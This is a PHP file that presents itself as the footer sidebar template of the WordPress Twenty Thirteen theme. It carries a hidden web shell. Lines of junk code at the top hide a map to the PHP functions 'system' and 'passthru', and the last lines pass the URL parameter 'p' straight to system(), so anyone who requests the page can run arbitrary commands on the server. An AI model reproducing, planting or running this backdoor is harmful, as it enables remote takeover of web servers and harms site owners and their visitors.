<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php
/**
 * The sidebar containing the footer widget area
 *
 * If no active widgets in this sidebar, hide it completely.
 *
 * @package WordPress
 * @subpackage Twenty_Thirteen
 * @since Twenty Thirteen 1.0
 */

if ( is_active_sidebar( 'sidebar-1' ) ) : ?>
	<div id="secondary" class="sidebar-container" role="complementary">
		<div class="widget-area">
			<?php dynamic_sidebar( 'sidebar-1' ); ?>
		</div><!-- .widget-area -->
	</div><!-- #secondary -->
<?php endif; ?>

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>